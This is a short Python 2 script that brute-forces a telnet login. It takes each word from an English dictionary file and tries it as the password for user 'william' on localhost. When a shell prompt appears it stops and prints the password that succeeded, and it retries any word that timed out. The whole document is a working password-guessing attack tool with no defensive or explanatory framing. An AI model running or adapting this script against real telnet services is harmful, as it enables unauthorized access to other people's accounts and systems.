#!/usr/bin/python
import os
import sys
import telnetlib

HOSTNAME = "localhost"
USERNAME = "william"
CONNECT_TIMEOUT = 5
AUTH_TIMEOUT = 10

def ReadUntil(tn, expected, log_message, timeout):
	output = tn.read_until(expected, timeout)
	print "\t\t\"" + output.replace("\n", "\n\t\t") + "\""
	#print log_message + ": '" + output + "' //END " + log_message
	return output.rfind(expected) != -1

f = open("american-english", "r")

retry = False
line = ""

while 1:
	if retry:
		retry = False
	else:
		line = f.readline()
	
	password = line.strip()
	
	print "Connecting..."
	tn = telnetlib.Telnet(HOSTNAME)
	
	print "Connected, waiting for login prompt..."
	if not ReadUntil(tn, "login: ", "Login prompt", CONNECT_TIMEOUT):
		print "\n>> Username Timeout when entering pass '" + password + "'!\n"
		retry = True
		tn.close()
		continue
	
	print "Putting in login..."
	tn.write(USERNAME + "\r\n")
	print "Waiting for password..."
	
	if not ReadUntil(tn, "Password: ", "Password prompt", CONNECT_TIMEOUT):
		print "\n>> Password Timeout when entering pass '" + password + "'!\n"
		retry = True
		tn.close()
		continue
	
	print "*** Trying '" + password + "'..."
	tn.write(password + "\r\n")
	#ReadUntil(tn, password, "Getting password back", 1)
	
	
	if not ReadUntil(tn, "$ ", "Login check!", AUTH_TIMEOUT):
		print "\tIncorrect password\n\n"
	else:
		print "<< Success on password '" + line.strip() + "'! >>"
		sys.exit(0)
	
	tn.close()
	print ""

